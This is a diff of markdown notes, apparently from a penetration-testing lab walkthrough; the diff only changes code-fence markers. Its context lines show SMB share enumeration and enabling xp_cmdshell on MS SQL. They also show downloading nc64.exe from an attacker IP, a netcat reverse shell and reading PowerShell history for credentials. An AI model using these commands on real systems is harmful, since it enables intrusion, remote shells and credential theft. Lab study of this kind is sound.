@@ -19,7 +19,7 @@ use auxiliary/scanner/smb/smb_enumshares
 > Connect to Smb Share 
 ```
 smbclient //IP/smbsharename -N
-```bash
+```
 ```python
  > Impacket command:
  > 
@@ -37,7 +37,7 @@ RECONFIGURE;
 sp_configure; - Enabling the sp_configure as stated in the above error message
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
-```bash
+```
 ```bash
 xp_cmdshell "whoami"
 ```
@@ -45,7 +45,7 @@ xp_cmdshell "whoami"
 
 ```
 EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; Invoke-WebRequest -Uri http://10.10.15.73/nc64.exe -OutFile nc64.exe"';
-```bash
+```
 ```sql
 Execute .exe payload:
 ```bash
@@ -56,4 +56,4 @@ EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cm
 >file from winpeas:
 ```
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```bash
+```
